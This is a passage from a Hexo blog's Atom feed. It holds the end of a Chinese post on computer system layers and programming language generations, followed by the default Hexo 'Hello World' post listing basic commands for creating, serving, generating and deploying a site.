title="计算机系统层次"></a>计算机系统层次</h2><ul><li><p>最早的计算机用机器语言编程</p><ul><li><p>机器语言称为第一代成语设计语言(1GL)</p><p><strong>应用程序—-指令集体系结构—-计算机硬件</strong></p></li></ul></li><li><p>后来用汇编语言编程</p><ul><li><p>汇编语言称为第二代程序设计语言(2GL)</p><p><strong>应用程序—-汇编程序—-操作系统—-指令集体系结构—-计算机硬件</strong></p></li></ul></li><li><p>现代计算机用高级语言编程</p><ul><li><p>第三代程序语言(3GL)为过程式语言，编码时需要描述实现过程，即”如何做”</p></li><li><p>第四代程序设计语言(4GL)为非过程化语言，编码时只需说明”做什么”，不需描述具体的算法实现细节。</p><p><strong>应用程序—-语言处理系统—-操作系统—-指令集体系结构—-计算机硬件</strong></p></li></ul></li></ul><p><strong>语言处理系统</strong>包括：各种语言处理程序(如编译、汇编、链接)、运行时系统(如库函数、调试、优化等功能)</p><p><strong>操作系统</strong>包括人机交互界面、提供服务功能的内核例程</p><p><em>可以看出：语言的发展是一个不断</em>*”抽象”*<em>的过程，因而，相应的计算机系统也不断有新的层次出现</em></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;编译系统&quot;&gt;&lt;a href=&quot;#编译系统&quot; class=&quot;headerlink&quot; title=&quot;编译系统&quot;&gt;&lt;/a&gt;编译系统&lt;/h2&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://antihypezero.github.io/2022/07/05/hello-world/"/>
    <id>http://antihypezero.github.io/2022/07/05/hello-world/</id>
    <published>2022-07-04T17:15:38.584Z</published>
    <updated>2022-07-08T18:08:32.865Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
